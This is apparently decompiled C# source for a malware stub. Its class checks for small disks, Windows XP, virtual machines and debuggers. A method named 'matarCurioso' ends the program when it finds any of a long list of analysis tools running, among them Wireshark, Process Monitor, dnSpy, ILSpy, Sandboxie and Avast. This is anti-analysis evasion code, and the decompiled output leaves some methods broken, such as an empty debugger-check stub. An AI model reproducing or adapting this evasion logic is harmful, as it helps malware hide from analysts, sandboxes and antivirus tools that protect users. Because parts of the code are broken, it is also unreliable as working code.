using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace stubPrincipal
{
	// Token: 0x0200001A RID: 26
	public class Classudo
	{
		// Token: 0x06000D54 RID: 3412 RVA: 0x000427C0 File Offset: 0x000409C0
		public static bool IsSmallDisk()
		{
			try
			{
				long num = 61000000000L;
				if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000D55 RID: 3413 RVA: 0x00042814 File Offset: 0x00040A14
		public static bool IsXP()
		{
			try
			{
				if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000D56 RID: 3414 RVA: 0x00042864 File Offset: 0x00040A64
		public static bool DetectVirtualMachine()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							if ((object.Equals(text, "microsoft corporation") && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
				}
			}
			return false;
		}

		// Token: 0x06000D57 RID: 3415 RVA: 0x0004295C File Offset: 0x00040B5C
		private static bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent)
		{
			bool result;
			return result;
		}

		// Token: 0x06000D58 RID: 3416 RVA: 0x0004296C File Offset: 0x00040B6C
		public static bool DetectDebugger()
		{
			bool result = false;
			Classudo.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref result);
			return result;
		}

		// Token: 0x06000D59 RID: 3417 RVA: 0x00042990 File Offset: 0x00040B90
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static object matarCurioso()
		{
			try
			{
				foreach (Process process in Process.GetProcessesByName("procexp"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process2 in Process.GetProcessesByName("TCPView"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process3 in Process.GetProcessesByName("TCP/UDP endpoint viewer"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process4 in Process.GetProcessesByName("de4dot"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process5 in Process.GetProcessesByName("SbieCtrl"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process6 in Process.GetProcessesByName("SpyTheSpy"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process7 in Process.GetProcessesByName("wireshark"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process8 in Process.GetProcessesByName("Charles"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process9 in Process.GetProcessesByName("Charles Web Debugging Proxy"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process10 in Process.GetProcessesByName("apateDNS"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process11 in Process.GetProcessesByName("procmon"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process12 in Process.GetProcessesByName("Process Monitor"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process13 in Process.GetProcessesByName("IPBlocker"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process14 in Process.GetProcessesByName("TiGeR-Firewall"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process15 in Process.GetProcessesByName("smsniff"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process16 in Process.GetProcessesByName("exeinfoPE"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process17 in Process.GetProcessesByName("NetSnifferCs"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process18 in Process.GetProcessesByName("Sandboxie Control"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process19 in Process.GetProcessesByName("processhacker"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process20 in Process.GetProcessesByName("dnSpy"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process21 in Process.GetProcessesByName("CodeReflect"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process22 in Process.GetProcessesByName("Reflector"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process23 in Process.GetProcessesByName("ILSpy"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process24 in Process.GetProcessesByName("VGAuthService"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process25 in Process.GetProcessesByName("VBoxService"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process26 in Process.GetProcessesByName("Avast"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process27 in Process.GetProcessesByName("Avast Software Analyzer"))
				{
					ProjectData.EndApp();
				}
				foreach (Process process28 in Process.GetProcessesByName("Avast Updater"))
				{
					ProjectData.EndApp();
				}
			}
			catch (Exception ex)
			{
			}
			object result;
			return result;
		}
	}
}
